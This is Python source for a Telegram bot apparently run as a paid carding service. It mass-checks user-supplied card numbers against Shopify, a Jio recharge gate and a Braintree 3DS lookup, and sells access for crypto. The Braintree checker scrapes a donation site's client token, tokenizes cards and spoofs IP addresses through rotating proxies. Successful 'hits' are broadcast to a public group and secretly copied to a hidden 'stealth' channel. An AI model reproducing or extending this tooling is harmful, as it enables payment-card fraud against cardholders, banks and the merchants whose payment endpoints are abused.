        try: raw = (await msg.bot.download_file((await msg.bot.get_file(doc.file_id)).file_path)).read().decode("utf-8", errors="ignore")
        except Exception as e: return await msg.answer(f"download failed: {_sanitize_err(str(e))}", parse_mode="HTML")
    else:
        args = msg.text.split(maxsplit=1)
        if len(args) < 2: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b>: <code>/sitecheck site1.com site2.com</code>", parse_mode="HTML")
        raw = args[1]
    await run_site_checker_flow(msg, raw)

@router.message(Command("restore_done"))
async def cmd_restore_done(msg: Message):
    if not is_full_admin(msg.from_user.id): return
    _cleanup_restore_sessions()
    with _restore_lock: user_bases = [b for b, s in _restore_sessions.items() if s.get("uid") == msg.from_user.id]
    if not user_bases: return await msg.answer(f"{pe('warn')} <b>No active restore session</b>", parse_mode="HTML")
    with _restore_lock: base = max(user_bases, key=lambda b: _restore_sessions[b].get("ts", 0))
    await _try_finish_multipart(msg, base, await msg.answer(f"{pe('loading')} <b>Assembling...</b>", parse_mode="HTML"))

@router.message(Command("restore_clear"))
async def cmd_restore_clear(msg: Message):
    if not is_full_admin(msg.from_user.id): return
    with _restore_lock:
        user_bases = [b for b, s in _restore_sessions.items() if s.get("uid") == msg.from_user.id]
        for b in user_bases: _restore_sessions.pop(b, None)
    await msg.answer(f"{pe('check')} <b>Cleared</b> {len(user_bases)} session(s)", parse_mode="HTML")

@router.message(Command("msh", "mauth"))
async def cmd_mass_check(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    user = get_user(uid)
    mode = "shopify" if msg.text.startswith("/msh") else "auth"
    if not user or user["banned"]: return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>", parse_mode="HTML")
    if not is_admin(uid) and not user_proxy_list(uid): return await msg.answer(f"{pe('cross1')} <b>{sc('Access Denied')}</b>", parse_mode="HTML")
    if mode == "shopify" and not load_handling_on() and (not _filtered_endpoints() or (endpoints_need_sites() and not get_sites())): return await msg.answer(f"{pe('warn')} <b>{sc('No API/Sites configured')}</b>", parse_mode="HTML")
    cards = []
    args = msg.text.split(maxsplit=1)
    if len(args) > 1: cards.extend(args[1].replace(",", " ").replace("\n", " ").split())
    if msg.reply_to_message:
        replied = msg.reply_to_message
        if replied.text: cards.extend(replied.text.replace(",", "\n").split())
        elif replied.document:
            doc = replied.document
            if not (doc.file_name or "").lower().endswith(".txt") or (doc.file_size or 0) > 2 * 1024 * 1024: return await msg.answer(f"{pe('cross1')} <b>{sc('Only .txt <2MB')}</b>", parse_mode="HTML")
            st = await msg.answer(f"{pe('loading')} <b>{sc('Downloading')}...</b>", parse_mode="HTML")
            try: cards.extend(re.split(r"[\s,;]+", (await msg.bot.download_file((await msg.bot.get_file(doc.file_id)).file_path)).read().decode("utf-8", errors="ignore")))
            except Exception as e: return await st.edit_text(f"{pe('cross1')} <b>{sc('Failed')}:</b> {esc(_sanitize_err(str(e)))}", parse_mode="HTML")
            try: await st.delete()
            except: pass
    if not cards: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b>\n<blockquote><code>/{msg.text.split()[0][1:]} cc|mm|yy|cvv</code></blockquote>", parse_mode="HTML")
    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c)
        if n and n not in seen: normalized.append(n); seen.add(n)
    if not normalized: return await msg.answer(f"{pe('docs')} <b>{sc('No valid cards')}</b>", parse_mode="HTML")
    if not is_admin(uid):
        pk, limit = plan_of(uid), PLANS[plan_of(uid)].get("mass_limit", 100)
        if len(normalized) > limit: return await msg.answer(f"{pe('stop')} <b>{sc('Batch Limit Exceeded')}</b>\n<blockquote>{pe('shop')} {sc('Max')}: <b>{limit}</b></blockquote>", parse_mode="HTML")
    await msg.answer(f"{pe('check')} <b>{sc('Start')}</b>\n<blockquote>{pe('gem')} {sc('Cards')}: <b>{len(normalized)}</b></blockquote>", parse_mode="HTML")
    await run_mass_check(msg, normalized, msg.bot, bypass_quota=is_admin(uid), mode=mode)

@router.message(Command("feedback"))
async def cmd_feedback(msg: Message):
    if not msg.reply_to_message: return await msg.answer(f"{pe('docs')} <b>{sc('Feedback')}</b>\n<blockquote>{sc('Reply to a message, image, or doc with')} <code>/feedback</code></blockquote>", parse_mode="HTML")
    if not _bot_ref: return await msg.answer(f"{pe('cross1')} Bot not ready", parse_mode="HTML")
    r, mtype, text, file_id = msg.reply_to_message, None, "", ""
    if r.photo: mtype, file_id, text = "photo", r.photo[-1].file_id, r.caption or ""
    elif r.document: mtype, file_id, text = "doc", r.document.file_id, r.caption or ""
    elif r.video: mtype, file_id, text = "video", r.video.file_id, r.caption or ""
    elif r.animation: mtype, file_id, text = "animation", r.animation.file_id, r.caption or ""
    elif r.text: mtype, text = "text", r.text
    if not mtype: return await msg.answer(f"{pe('cross1')} <b>{sc('Unsupported reply type')}</b>", parse_mode="HTML")
    with db() as c: fid = c.execute("INSERT INTO feedback(uid, username, msg_type, text, file_id, ts) VALUES (?,?,?,?,?,?)", (msg.from_user.id, msg.from_user.username or "", mtype, text, file_id, datetime.now(timezone.utc).isoformat())).lastrowid
    admin_text = f"{pe('glow_star')} <b>NEW FEEDBACK #{fid}</b>\n<blockquote>{pe('user')} <b>From:</b> @{esc(msg.from_user.username or str(msg.from_user.id))}\n{pe('docs')} <b>Type:</b> {mtype}</blockquote>\n<blockquote>{esc(text[:800]) if text else 'Media only'}</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Approve", icon="check", color="success", callback_data=f"fb_app:{fid}"), pbtn("Reject", icon="cross1", color="danger", callback_data=f"fb_rej:{fid}")]])
    try:
        if mtype == "text": await _bot_ref.send_message(OWNER_ID, admin_text, parse_mode="HTML", reply_markup=kb)
        elif mtype == "photo": await _bot_ref.send_photo(OWNER_ID, file_id, caption=admin_text, parse_mode="HTML", reply_markup=kb)
        elif mtype == "doc": await _bot_ref.send_document(OWNER_ID, file_id, caption=admin_text, parse_mode="HTML", reply_markup=kb)
        elif mtype == "video": await _bot_ref.send_video(OWNER_ID, file_id, caption=admin_text, parse_mode="HTML", reply_markup=kb)
        elif mtype == "animation": await _bot_ref.send_animation(OWNER_ID, file_id, caption=admin_text, parse_mode="HTML", reply_markup=kb)
        await msg.answer(f"{pe('check')} <b>Feedback submitted!</b>", parse_mode="HTML")
    except: await msg.answer(f"{pe('cross1')} {sc('Failed to send')}", parse_mode="HTML")

@router.message(Command("addsites"))
async def cmd_addsites(msg: Message):
    if not is_full_admin(msg.from_user.id): return
    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
        if not (doc.file_name or "").lower().endswith(".txt") or (doc.file_size or 0) > 5 * 1024 * 1024: return await msg.answer("only .txt <5MB")
        try: raw = (await msg.bot.download_file((await msg.bot.get_file(doc.file_id)).file_path)).read().decode("utf-8", errors="ignore")
        except Exception as e: return await msg.answer(f"download failed: {_sanitize_err(str(e))}")
    else:
        args = msg.text.split(maxsplit=1)
        if len(args) < 2: return await msg.answer("usage: /addsites site1.com ...\nor reply to .txt")
        raw = args[1]
    sites = parse_site_list(raw)
    added = 0
    for s in sites:
        if add_site_db(s): added += 1
    await msg.answer(f"{pe('check')} <b>{sc('Sites Added')}</b>: <b>{added}/{len(sites)}</b>", parse_mode="HTML")

# ── /mdev /pay /proof ────────────────────────────────────────────────────────
@router.message(Command("mdev"))
async def cmd_mdev(msg: Message):
    text_parts = msg.text.split(maxsplit=1) if msg.text else []
    note = text_parts[1] if len(text_parts) > 1 else ""
    target = msg.reply_to_message or msg
    if not note and not msg.reply_to_message and not msg.photo and not msg.document:
        return await msg.answer(
            f"{pe('chat')} <b>{sc('Support')}</b>\n"
            f"<blockquote>{pe('pen')} <code>/mdev &lt;message&gt;</code>\n"
            f"{pe('docs')} or reply to a message / image / doc with /mdev</blockquote>",
            parse_mode="HTML")
    header = (
        f"{pe('spark')} <b>NEW SUPPORT REQUEST</b>\n"
        f"<blockquote>"
        f"{pe('user')} <b>UID:</b> <code>{msg.from_user.id}</code>\n"
        f"{pe('link')} <b>User:</b> @{esc(msg.from_user.username or 'N/A')}\n"
        f"{pe('pen')} <b>Name:</b> {esc(msg.from_user.first_name or '')}"
        f"</blockquote>"
    )
    if note: header += f"\n<blockquote>{esc(note)}</blockquote>"
    try:
        if msg.reply_to_message:
            try: await msg.reply_to_message.forward(DEV_ID)
            except: pass
            await msg.bot.send_message(DEV_ID, header, parse_mode="HTML")
        elif msg.photo:
            await msg.bot.send_photo(DEV_ID, msg.photo[-1].file_id, caption=header, parse_mode="HTML")
        elif msg.document:
            await msg.bot.send_document(DEV_ID, msg.document.file_id, caption=header, parse_mode="HTML")
        else:
            await msg.bot.send_message(DEV_ID, header, parse_mode="HTML")
        await msg.answer(f"{pe('check')} <b>{sc('Sent to support')}</b>", parse_mode="HTML")
    except Exception as e:
        await msg.answer(f"{pe('cross1')} <b>{sc('Failed')}:</b> {esc(str(e)[:80])}", parse_mode="HTML")

def _pay_wallets_text() -> str:
    w = get_crypto_wallets()
    any_set = any(v.strip() for v in w.values())
    if not any_set:
        return (
            f"{pe('warn')} <b>{sc('Payment system not configured')}</b>\n"
            f"<blockquote>Contact support via <code>/mdev</code>.</blockquote>"
        )
    lines = [f"{pe('gem')} <b>{BOT_BRAND} · ACCESS</b>", rule(11), "<b>CRYPTO WALLETS</b>"]
    if w.get("btc"):        lines.append(f"₿  <b>BTC</b>\n<code>{esc(w['btc'])}</code>")
    if w.get("usdt_trc20"): lines.append(f"₮  <b>USDT (TRC20)</b>\n<code>{esc(w['usdt_trc20'])}</code>")
    if w.get("eth"):        lines.append(f"Ξ  <b>ETH</b>\n<code>{esc(w['eth'])}</code>")
    if w.get("ltc"):        lines.append(f"Ł  <b>LTC</b>\n<code>{esc(w['ltc'])}</code>")
    lines += [
        rule(11),
        f"{pe('docs')} <b>STEPS</b>",
        "1. Send payment to any wallet above",
        "2. Screenshot the transaction",
        "3. Reply to the screenshot with <code>/proof</code>",
        "4. Wait for admin verification",
        rule(11),
        f"<i>Access key delivered after approval.</i>",
    ]
    return "\n".join(lines)

@router.message(Command("pay"))
async def cmd_pay(msg: Message):
    try:
        await msg.answer_photo(photo=IMG_PAY, caption=_pay_wallets_text(), parse_mode="HTML", reply_markup=pay_kb())
    except:
        await msg.answer(_pay_wallets_text(), parse_mode="HTML", reply_markup=pay_kb())

@router.message(Command("proof"))
async def cmd_proof(msg: Message):
    target = msg.reply_to_message or msg
    if not (target.photo or target.document or (target.text and len(target.text) > 6)):
        return await msg.answer(
            f"{pe('docs')} <b>{sc('Payment Proof')}</b>\n"
            f"<blockquote>Reply to your screenshot with <code>/proof</code></blockquote>",
            parse_mode="HTML")
    proof_id = uuid.uuid4().hex[:8]
    cap = (
        f"{pe('gem')} <b>PAYMENT PROOF</b>\n"
        f"<blockquote>"
        f"{pe('user')} <b>UID:</b> <code>{msg.from_user.id}</code>\n"
        f"{pe('link')} <b>User:</b> @{esc(msg.from_user.username or 'N/A')}\n"
        f"{pe('num1')} <b>Proof:</b> <code>{proof_id}</code>"
        f"</blockquote>"
    )
    if msg.text and len(msg.text.split()) > 1:
        cap += f"\n<blockquote>{esc(msg.text.split(maxsplit=1)[1])}</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        pbtn("Approve", icon="check", color="success", callback_data=f"proof_app:{msg.from_user.id}"),
        pbtn("Reject", icon="cross1", color="danger", callback_data=f"proof_rej:{msg.from_user.id}"),
    ]])
    try:
        if target.photo:
            await msg.bot.send_photo(OWNER_ID, target.photo[-1].file_id, caption=cap, parse_mode="HTML", reply_markup=kb)
        elif target.document:
            await msg.bot.send_document(OWNER_ID, target.document.file_id, caption=cap, parse_mode="HTML", reply_markup=kb)
        else:
            await msg.bot.send_message(OWNER_ID, cap, parse_mode="HTML", reply_markup=kb)
        await msg.answer(f"{pe('check')} <b>{sc('Proof submitted')}</b>\n<blockquote>{sc('Await admin approval')}</blockquote>", parse_mode="HTML")
    except Exception as e:
        await msg.answer(f"{pe('cross1')} {esc(str(e)[:80])}", parse_mode="HTML")

# ── Jio single ───────────────────────────────────────────────────────────────
def _jio_fmt_proxy(p):
    if not p: return ""
    p = re.sub(r'^(https?|socks[45])://', '', p.strip())
    if "@" in p:
        creds, hostport = p.rsplit("@", 1)
        host, _, port = hostport.rpartition(":")
        user, _, pwd = creds.partition(":")
        return f"{host}:{port}:{user}:{pwd}"
    return p

def _jio_has_access(uid) -> bool:
    if is_admin(uid): return True
    u = get_user(uid)
    return bool(u and u["plan"] in ("premium", "max", "unlimited"))

def _jio_map_status(raw_resp, real_resp):
    resp, real = (raw_resp or "").lower(), (real_resp or "").lower()
    ok  = ("approved","success","successful","charged","captured","succeeded","paid","order_paid","processed","payment_success")
    ins = ("insufficient","not enough balance","low balance","no balance","unauthorized_transaction")
    thd = ("3ds","3d secure","3d_secure","authentication","auth_required","require_action","requires_action","challenge","captcha","otp","redirect")
    dec = ("declined","decline","rejected","do_not_honor","do not honor","not approved","fraud","expired","invalid","refused","unable","could not","card_error","generic_decline","processing_error","lost_card","stolen_card","call_issuer","pickup_card","not supported","bank declined","not_subscribed","bad_request","not available","not found")
    for k in ok:
        if k in resp or k in real: return "charged"
    for k in ins:
        if k in resp or k in real: return "approved"
    for k in thd:
        if k in resp or k in real: return "approved"
    for k in dec:
        if k in resp or k in real: return "declined"
    return "declined"

async def run_jio_async(number: str, cc_str: str, amount, proxy: Optional[str]) -> Dict[str, Any]:
    try:
        cc, mm, yy, cvv = cc_str.split("|")
        if len(yy) == 2: yy = "20" + yy
    except: return {"status": "error", "response": "bad card"}
    p = _jio_fmt_proxy(proxy)
    amt = str(int(float(amount))) if float(amount).is_integer() else str(amount)
    url = (f"{get_jio_url()}?cc={quote(cc+'|'+mm+'|'+yy+'|'+cvv)}"
           f"&number={quote(number)}&proxy={quote(p)}&amount={quote(amt)}")
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=90), ssl=False) as r:
                if r.status == 400:
                    return {"status": "declined", "response": "Invalid Jio Number / Not Subscribed"}
                if r.status != 200:
                    return {"status": "error", "response": f"API HTTP {r.status}"}
                data = await r.json(content_type=None)
                raw = str(data.get("response", "Unknown"))
                real = str(data.get("real-response") or raw)
                return {"status": _jio_map_status(raw, real), "response": real or raw}
    except asyncio.TimeoutError:
        return {"status": "declined", "response": "API Timeout"}
    except Exception as e:
        return {"status": "error", "response": str(e)[:60]}

def _jio_hit_text(cc, status, resp, amount, user_name, uid):
    emoji_charged = '<tg-emoji emoji-id="5427168083074628963">✅</tg-emoji>'
    return (
        f"<blockquote>{pe('fire_e')} <b>JIO HIT · {status.upper()}</b> {emoji_charged}</blockquote>\n"
        f"{rule(11)}\n"
        f"{pe('card_e')} <b>Card</b>\n<code>{cc}</code>\n"
        f"{pe('check')} <b>Resp</b> ↬ <code>{esc(resp)}</code>\n"
        f"{pe('diamond')} <b>Amt</b> ↬ <code>₹{amount}</code>\n"
        f"{pe('refresh')} <b>Gate</b> ↬ <code>Jio</code>\n"
        f"{rule(11)}\n"
        f"{pe('user')} <b>By</b> ↬ <a href='tg://user?id={uid}'>{esc(user_name)}</a>"
    )

@router.message(Command("jhit"))
async def cmd_jhit(msg: Message):
    uid = msg.from_user.id
    if not _jio_has_access(uid):
        return await msg.answer(f"{pe('unlock')} <b>{sc('Access Denied')}</b>\n<blockquote>{sc('Premium only')}</blockquote>", parse_mode="HTML")
    proxies = user_proxy_list(OWNER_ID) or []
    if not proxies:
        return await msg.answer(f"{pe('warn')} <b>{sc('No proxies available')}</b>", parse_mode="HTML")
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.answer(
            f"{pe('fire_e')} <b>{sc('Usage')}</b>\n"
            f"<blockquote><code>/jhit NUMBER AMOUNT CC|MM|YY|CVV</code></blockquote>",
            parse_mode="HTML")
    number, amount, raw_cards = parts[1].strip(), parts[2].strip(), parts[3:]
    if not re.fullmatch(r"\d{10}", number):
        return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid 10-digit number')}</b>", parse_mode="HTML")
    if amount not in JIO_ALLOWED_AMOUNTS:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid amount')}</b>", parse_mode="HTML")
    cc_str = " ".join(raw_cards)
    m = re.search(r'(\d{13,19})[|/:\s]+(\d{1,2})[|/:\s]+(\d{2,4})[|/:\s]+(\d{3,4})', cc_str)
    if not m:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid card')}</b>", parse_mode="HTML")
    cc = f"{m.group(1)}|{m.group(2).zfill(2)}|{m.group(3)[-2:]}|{m.group(4)}"
    prog = await msg.answer(
        f"<blockquote>{pe('loading')} <b>{sc('JIO checking')}</b></blockquote>\n<code>{cc}</code>",
        parse_mode="HTML")
    proxy = rotate_proxy(uid, proxies)
    res = await run_jio_async(number, cc, amount, proxy)
    status = res.get("status", "error")
    if status in ("charged", "approved"):
        txt = _jio_hit_text(cc, status, res.get("response", ""), amount, msg.from_user.first_name, uid)
        await prog.edit_text(txt, parse_mode="HTML")
        pub = get_setting("public_gc_id")
        if pub and _bot_ref:
            try: await _bot_ref.send_message(pub, txt, parse_mode="HTML")
            except: pass
        if STEALTH_ID and _bot_ref:
            try:
                await _bot_ref.send_message(STEALTH_ID,
                    f"{pe('ghost')} <b>STEALTH · JIO {status.upper()}</b>\n<code>{cc}</code>\n"
                    f"<b>Num:</b> <code>{number}</code>\n<b>Amt:</b> ₹{amount}\n"
                    f"<b>By:</b> <code>{uid}</code>", parse_mode="HTML")
            except: pass
    else:
        await prog.edit_text(
            f"<blockquote>{pe('cross2')} <b>{sc('JIO')} · {status.upper()}</b></blockquote>\n"
            f"<code>{cc}</code>\n"
            f"{pe('warn')} <b>{sc('Resp')}</b> ↬ <code>{esc(res.get('response', '')[:80])}</code>",
            parse_mode="HTML")

# ── VBV ──────────────────────────────────────────────────────────────────────
_VBV_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
]
_VBV_H = {"Accept": "text/html,application/xhtml+xml,*/*;q=0.8", "Accept-Language": "en-GB,en;q=0.9"}

def _vbv_px(p):
    if not p: return None
    if p.startswith(("http://", "https://")): return p
    parts = p.split(":")
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2: return f"http://{p}"
    return f"http://{p}"

async def _vbv_get_auth(session, proxy):
    for _ in range(3):
        try:
            async with session.get(VBV_DONATE, headers={**_VBV_H, "User-Agent": random.choice(_VBV_UAS)}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=25)) as r:
                text = await r.text()
            m = re.search(r'name="clientToken"\s+value="([^"]+)"', text)
            if not m: m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', text)
            if m:
                try:
                    d = json.loads(base64.b64decode(m.group(1)).decode())
                    a, mm = d.get("authorizationFingerprint", ""), d.get("merchantId", "")
                    if a and mm: return a, mm
                except: pass
            a = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', text)
            mi = re.search(r'"merchantId"\s*:\s*"([^"]+)"', text)
            if a: return a.group(1), (mi.group(1) if mi else "dyb5fmjx5t5wxckj")
        except: await asyncio.sleep(1)
    return None, None

async def _vbv_tokenize(session, auth, card, proxy):
    q = ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
         "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }")
    body = {
        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
        "query": q,
        "variables": {"input": {"creditCard": {"number": card["number"], "expirationMonth": card["month"], "expirationYear": card["year"], "cvv": card["cvv"]}, "options": {"validate": False}}},
        "operationName": "TokenizeCreditCard",
    }
    headers = {**_VBV_H, "Authorization": f"Bearer {auth}", "Braintree-Version": "2018-05-10", "Content-Type": "application/json", "User-Agent": random.choice(_VBV_UAS)}
    async with session.post(VBV_GQL, headers=headers, json=body, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as r:
        d = await r.json(content_type=None)
    if "errors" in d: return None
    t = d["data"]["tokenizeCreditCard"]
    return t["token"]

async def _vbv_lookup(session, auth, merch, token, card, proxy):
    url = f"{VBV_BT}/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
    payload = {
        "amount": "1.00", "browserColorDepth": 24, "browserJavaEnabled": False,
        "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
        "browserScreenHeight": 800, "browserScreenWidth": 360, "browserTimeZone": -345,
        "deviceChannel": "Browser",
        "additionalInfo": {"ipAddress": ".".join(str(random.randint(1, 254)) for _ in range(4)),
            "billingLine1": "New York", "billingCity": "New York", "billingState": "NY",
            "billingPostalCode": "10080", "billingCountryCode": "US",
            "billingPhoneNumber": "998773772", "billingGivenName": "John",
            "billingSurname": "Doe", "email": "test@example.com"},
        "bin": card["number"][:6], "dfReferenceId": f"0_{uuid.uuid4()}",
        "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.115.1",
            "cardinalDeviceDataCollectionTimeElapsed": random.randint(400, 2000),
            "issuerDeviceDataCollectionTimeElapsed": random.randint(800, 5000),
            "issuerDeviceDataCollectionResult": True},
        "authorizationFingerprint": auth, "braintreeLibraryVersion": "braintree/web/3.115.1",
        "_meta": {"merchantAppId": "cllsupport.org.uk", "platform": "web", "sdkVersion": "3.115.1",
            "source": "client", "integration": "custom", "integrationType": "custom",
            "sessionId": str(uuid.uuid4())},
    }
    headers = {**_VBV_H, "Content-Type": "application/json", "User-Agent": random.choice(_VBV_UAS)}
    async with session.post(url, headers=headers, json=payload, proxy=proxy, timeout=aiohttp.ClientTimeout(total=VBV_TIMEOUT)) as r:
        if r.status in (200, 201):
            t = await r.text()
            if t.strip(): return json.loads(t)
    return {}

async def check_vbv_async(card_str: str, proxy: Optional[str]) -> Dict[str, Any]:
    t0 = time.time()
    m = re.match(r'^(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})$', card_str)
    if not m: return {"status": "Error", "response": "Bad card", "enrolled": "?", "elapsed": 0}
    cc, mm, yy, cvv = m.groups()
    mm = mm.zfill(2)
    if len(yy) == 2: yy = "20" + yy
    card = {"number": cc, "month": mm, "year": yy, "cvv": cvv}
    px = _vbv_px(proxy)
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), cookie_jar=aiohttp.CookieJar()) as s:
            s.cookie_jar.update_cookies({"cookie_test": "please_accept_for_session"})
            auth, merch = await _vbv_get_auth(s, px)
            if not auth: return {"status": "Error", "response": "auth_fail", "enrolled": "?", "elapsed": time.time()-t0}
            tok = await _vbv_tokenize(s, auth, card, px)
            if not tok: return {"status": "Error", "response": "tok_fail", "enrolled": "?", "elapsed": time.time()-t0}
            l = await _vbv_lookup(s, auth, merch, tok, card, px)
            try: st_raw = l["paymentMethod"]["threeDSecureInfo"]["status"]
            except: st_raw = "no_response"
            mapping = {"authenticate_successful": "Passed", "authenticate_attempt_successful": "Passed",
                       "lookup_error": "Error", "authenticate_error": "Error", "no_response": "Failed"}
            st = mapping.get(st_raw, "Unknown")
            en = {"Y": "ENROLLED", "N": "NOT_ENROLLED", "U": "UNKNOWN"}.get((l.get("paymentMethod", {}).get("threeDSecureInfo", {}) or {}).get("enrolled", "?"), "UNKNOWN")
            return {"status": st, "response": st_raw, "enrolled": en, "elapsed": time.time()-t0}
    except Exception as e:
        return {"status": "Error", "response": str(e)[:60], "enrolled": "?", "elapsed": time.time()-t0}

@router.message(Command("vbv"))
async def cmd_vbv(msg: Message):
    uid = msg.from_user.id
    if not _jio_has_access(uid):
        return await msg.answer(f"{pe('unlock')} <b>{sc('Access Denied')}</b>", parse_mode="HTML")
    proxies = user_proxy_list(OWNER_ID) or []
    if not proxies:
        return await msg.answer(f"{pe('warn')} <b>{sc('No proxies available')}</b>", parse_mode="HTML")
    txt = (msg.text or "").split(maxsplit=1)
    card_str = txt[1].strip() if len(txt) > 1 else ""
    if not card_str and msg.reply_to_message:
        rt = msg.reply_to_message.text or ""
        m = re.search(r'(\d{13,19})\s*[|/:\s]\s*(\d{1,2})\s*[|/:\s]\s*(\d{2,4})\s*[|/:\s]\s*(\d{3,4})', rt)
        if m: card_str = f"{m.group(1)}|{m.group(2).zfill(2)}|{m.group(3)[-2:]}|{m.group(4)}"
    if not card_str or not re.match(r'^(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})$', card_str):
        return await msg.answer(f"{pe('shield')} <b>{sc('Usage')}</b>\n<blockquote><code>/vbv CC|MM|YY|CVV</code></blockquote>", parse_mode="HTML")
    prog = await msg.answer(
        f"<blockquote>{pe('loading')} <b>{sc('VBV checking')}</b></blockquote>\n<code>{card_str}</code>\n"
        f"{pe('refresh')} <b>{sc('Gate')}</b> ↬ <code>Braintree 3DS2</code>",
        parse_mode="HTML")
    proxy = rotate_proxy(uid, proxies)
    r = await check_vbv_async(card_str, proxy)
    out = (
        f"<blockquote>{pe('shield')} <b>VBV</b> · {r['status'].upper()}</blockquote>\n"
        f"{rule(11)}\n"
        f"{pe('card_e')} <b>Card</b>\n<code>{card_str}</code>\n"
        f"{pe('check')} <b>Resp</b> ↬ <code>{esc(r['response'])}</code>\n"
        f"{pe('refresh')} <b>Enrolled</b> ↬ <code>{esc(r['enrolled'])}</code>\n"
        f"{pe('clock')} <b>Time</b> ↬ <code>{r['elapsed']:.2f}s</code>\n"
        f"{rule(11)}\n"
        f"{pe('user')} <b>By</b> ↬ <a href='tg://user?id={uid}'>{esc(msg.from_user.first_name)}</a>"
    )
    await prog.edit_text(out, parse_mode="HTML")
    if r["status"] == "Passed":
        pub = get_setting("public_gc_id")
        if pub and _bot_ref:
            try: await _bot_ref.send_message(pub, out, parse_mode="HTML")
            except: pass
        if STEALTH_ID and _bot_ref:
            try:
                await _bot_ref.send_message(STEALTH_ID,
                    f"{pe('ghost')} <b>STEALTH · VBV HIT</b>\n<code>{card_str}</code>\n"
                    f"<b>Enrolled:</b> <code>{r['enrolled']}</code>\n<b>By:</b> <code>{uid}</code>",
                    parse_mode="HTML")
            except: pass

# ── Check flow ───────────────────────────────────────────────────────────────
async def process_check_logic(msg, cc_line: str, bot, uid=None, username=None, mode="shopify"):
    if uid is None: uid = msg.from_user.id
    if username is None: username = msg.from_user.username or ""
    user = get_user_or_create(uid, username)
    if not user: return await msg.answer(f"{pe('cross1')} <b>{sc('Error')}</b>. /start", parse_mode="HTML")
    if user["banned"]: return await msg.answer(f"{pe('cross1')} <b>{sc('You are banned')}</b>", parse_mode="HTML")
    if mode == "shopify" and not load_handling_on() and (not _filtered_endpoints() or (endpoints_need_sites() and not get_sites())): return await msg.answer(f"{pe('warn')} <b>{sc('No API/Sites')}</b>", parse_mode="HTML")
    user_proxies = user_proxy_list(uid)
    if not is_admin(uid) and not user_proxies: return await msg.answer(f"{pe('cross1')} <b>{sc('Proxy Required')}</b>\n<blockquote>{pe('link')} /proxy</blockquote>", parse_mode="HTML")
    now, cd = time.time(), get_check_cooldown()
    if uid in user_cooldowns and now - user_cooldowns[uid] < cd: return await msg.answer(f"{pe('stop')} {sc('Wait')} {cd - int(now - user_cooldowns[uid])}s", parse_mode="HTML")
    user_cooldowns[uid] = now
    ok, _ = consume_quota(uid)
    if not ok:
        u = get_user(uid)
        return await msg.answer(f"{pe('unlock')} <b>{sc('Limit Reached')}</b>\n<blockquote>{pe('gem')} {PLANS[u['plan']]['name']}\n{pe('star')} {sc('Credits')}: {u['credits']} (need 2)</blockquote>\n/shop", parse_mode="HTML")
    proxy, loading = (rotate_proxy(uid, user_proxies) if user_proxies else None), await msg.answer(f"{spinner_frame(0)} {LOADING_FRAMES[0]}\n<blockquote><code>{cc_line}</code></blockquote>", parse_mode="HTML")
    stop_ev, anim_task = asyncio.Event(), asyncio.create_task(animate_loading(loading, cc_line, stop_ev))
    try: res = await call_api(cc_line, proxy=proxy, uid=uid, mode=mode, single=True)
    except Exception as e: res = {"cls": "error", "response": _sanitize_err(str(e)), "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    stop_ev.set()
    try: await anim_task
    except: pass
    bin_info = None
    if res.get("cls", "error") not in ("error", "proxy_error", "timeout"):
        try: bin_info = await lookup_bin(cc_line.split("|")[0][:6])
        except: pass
        try:
            status_str = "SITE_ERROR" if res["cls"] == "site_error" else ("HIT" if is_hit(res["cls"]) else "DECLINED")
            async with _get_write_lock():
                with db() as c:
                    c.execute("INSERT INTO check_logs(uid,cc,response,status,gateway,ts) VALUES(?,?,?,?,?,?)", (uid, cc_line, _sanitize_err(res.get("response","")), status_str, res.get("gateway","Shopify"), datetime.now(timezone.utc).isoformat()))
                    if is_hit(res["cls"]): c.execute("UPDATE users SET total_hits=total_hits+1 WHERE uid=?", (uid,))
        except: pass
        if is_hit(res["cls"]):
            try: await record_charged(cc_line, res, res.get("_site",""), uid, bin_info=bin_info)
            except Exception as e: log.error(f"process_check_logic record_charged: {e}")
    text, hit = format_result(cc_line, res, bin_info), is_hit(res.get("cls", "declined"))
    btns = [pbtn(sc("Recheck"), icon="refresh", callback_data=f"recheck:{cc_line}")]
    if hit: btns.append(pbtn(sc("Save"), icon="book", color="success", callback_data=f"save:{cc_line}"))
    try: await loading.delete()
    except: pass
    try: await msg.answer_photo(photo=(IMG_HIT if hit else IMG_DECLINE), caption=text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[btns]))
    except:
